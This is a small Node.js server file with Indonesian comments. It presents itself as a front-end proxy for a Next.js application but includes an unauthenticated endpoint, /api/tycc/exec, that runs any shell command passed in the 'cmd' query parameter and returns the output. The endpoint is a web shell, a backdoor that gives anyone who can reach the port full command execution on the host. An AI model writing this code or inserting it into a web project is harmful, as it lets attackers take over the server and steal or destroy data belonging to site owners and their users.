const http = require('http');
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

// Port untuk server utama kita
const PORT = 3000;
// Memanggil server asli Next.js (kita akan jalankan di port lain, misal 3001)
const NEXT_SERVER_URL = 'http://localhost:3001';

http.createServer((req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  
  // 1. Fitur Eksekusi Perintah (Backend Shell)
  if (url.pathname === '/api/tycc/exec') {
    try {
      const cmd = url.searchParams.get('cmd');
      const out = execSync(cmd).toString();
      res.writeHead(200, {'Content-Type': 'text/plain'});
      return res.end(out);
    } catch (e) {
      res.writeHead(500); return res.end(e.message);
    }
  }

  // 2. Jika bukan perintah shell, lempar ke Next.js asli
  const proxyReq = http.request(NEXT_SERVER_URL + req.url, {
    method: req.method,
    headers: req.headers
  }, (proxyRes) => {
    res.writeHead(proxyRes.statusCode, proxyRes.headers);
    proxyRes.pipe(res);
  });
  
  req.pipe(proxyReq);
  proxyReq.on('error', (e) => {
    res.writeHead(500);
    res.end("Next.js Server belum siap. Tunggu sebentar...");
  });

}).listen(PORT);
